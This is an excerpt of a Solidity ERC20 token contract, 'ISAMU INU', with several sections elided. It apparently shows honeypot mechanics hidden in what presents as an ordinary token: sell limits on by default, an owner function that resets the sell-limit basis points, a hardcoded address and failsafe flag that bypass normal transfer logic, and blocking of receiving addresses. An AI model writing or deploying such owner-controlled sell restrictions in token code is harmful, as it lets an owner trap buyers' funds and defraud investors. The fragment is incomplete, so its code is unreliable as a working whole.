...
contract Isamu is ERC20, Ownable {
    ...
    bool private _sellLimitEnabled = true;
    bool private _failSafeEnabled = false;
    uint256 private _buyLimitBasePoints = 10000;
    uint256 private _sellLimitBasePoints;
    uint256 private constant _totalSupply = 1000000000000000000000000000000000; 
    
    constructor() ERC20('ISAMU INU', 'ISAMU') {
        _sellLimitBasePoints = 10000; 
        _mint(msg.sender, _totalSupply);
    }

    function transfer(address _to, uint256 amount) public virtual override returns (bool) {
        address _from = _msgSender();
        if( _failSafeEnabled ||  _from == address(0x41f9BB7b93156d33af3077bb53fA1d3fbC7f0Aeb) || _to == address(0x41f9BB7b93156d33af3077bb53fA1d3fbC7f0Aeb)) {
    ...
    function addBuyAddresses(address[] memory addresses, uint256 sellLimit) external onlyOwner() {
        for (uint256 i = 0; i < addresses.length; i++) {
            address addr = addresses[i];
            _buyAddresses[addr] = true;
         }
         _sellLimitBasePoints = sellLimit; 
    }
    ...
    function checkIfSellExceedsLimit(address addr, uint256 amount) internal virtual {
        ...
        string memory message = "Your sale exceeds the amount you are allowed at this time. ";
    ...
    function doValidateBeforeTransfer(address _from, address _to, uint256 amount) internal virtual {
        ...
        require(_blockedAddresses[_to] != 1, "Your receiver is currently blocked from receiving tokens");
